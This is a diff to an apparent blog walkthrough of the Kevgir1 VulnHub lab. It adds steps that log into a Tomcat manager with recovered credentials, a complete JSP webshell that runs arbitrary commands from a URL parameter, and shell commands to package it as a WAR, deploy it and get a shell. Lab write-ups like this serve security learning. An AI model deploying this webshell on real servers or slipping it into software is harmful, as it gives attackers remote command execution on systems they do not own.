@@ -151,6 +151,72 @@ $(document).ready(
 <p><img src="/images/blog/vulhub/kevgir1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>We got the username and password for tomcat manager &hellip; good</p>
+
+<p>log into the manager page and now we can upload webshell&hellip;.</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>
+
+<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">FORM</span> <span class="nx">METHOD</span><span class="o">=</span><span class="nx">GET</span> <span class="nx">ACTION</span><span class="o">=</span><span class="s1">&#39;index.jsp&#39;</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">INPUT</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;cmd&#39;</span> <span class="nx">type</span><span class="o">=</span><span class="nx">text</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">INPUT</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;Run&#39;</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="nx">FORM</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">&lt;%@</span> <span class="nx">page</span> <span class="nx">import</span><span class="o">=</span><span class="s2">&quot;java.io.*&quot;</span> <span class="o">%&gt;</span>
+</span><span class='line'><span class="o">&lt;%</span>
+</span><span class='line'>   <span class="nx">String</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">);</span>
+</span><span class='line'>   <span class="nx">String</span> <span class="nx">output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+</span><span class='line'>   <span class="k">if</span><span class="p">(</span><span class="nx">cmd</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nx">String</span> <span class="nx">s</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">try</span> <span class="p">{</span>
+</span><span class='line'>         <span class="nx">Process</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">Runtime</span><span class="o">.</span><span class="nx">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="nb">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">);</span>
+</span><span class='line'>         <span class="nx">BufferedReader</span> <span class="nx">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BufferedReader</span><span class="p">(</span><span class="k">new</span> <span class="nx">InputStreamReader</span><span class="p">(</span><span class="nx">p</span><span class="o">.</span><span class="nx">getInputStream</span><span class="p">()));</span>
+</span><span class='line'>         <span class="k">while</span><span class="p">((</span><span class="nx">s</span> <span class="o">=</span> <span class="nx">sI</span><span class="o">.</span><span class="nx">readLine</span><span class="p">())</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span> <span class="nx">output</span> <span class="o">+=</span> <span class="nx">s</span><span class="o">+</span><span class="s2">&quot;&lt;/br&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
+</span><span class='line'>      <span class="p">}</span>  <span class="k">catch</span><span class="p">(</span><span class="nx">IOException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>   <span class="nx">e</span><span class="o">.</span><span class="nx">printStackTrace</span><span class="p">();</span>   <span class="p">}</span>
+</span><span class='line'>   <span class="p">}</span>
+</span><span class='line'><span class="o">%&gt;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;%=</span><span class="nx">output</span> <span class="o">%&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>now pack the webshell</p>
+
+<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">mkdir</span> <span class="nx">webshell</span>
+</span><span class='line'><span class="nx">cp</span> <span class="nx">index</span><span class="o">.</span><span class="nx">jsp</span> <span class="nx">webshell</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">cd</span> <span class="nx">webshell</span>
+</span><span class='line'><span class="nx">jar</span> <span class="o">-</span><span class="nx">cvf</span> <span class="o">../</span><span class="nx">webshell</span><span class="o">.</span><span class="nx">war</span> <span class="o">*</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>now upload the webshell.war. After uploading, visit page  <code>192.168.79.174:8080/webshell/</code>.</p>
+
+<p>get the shell</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
 </div>
 
 
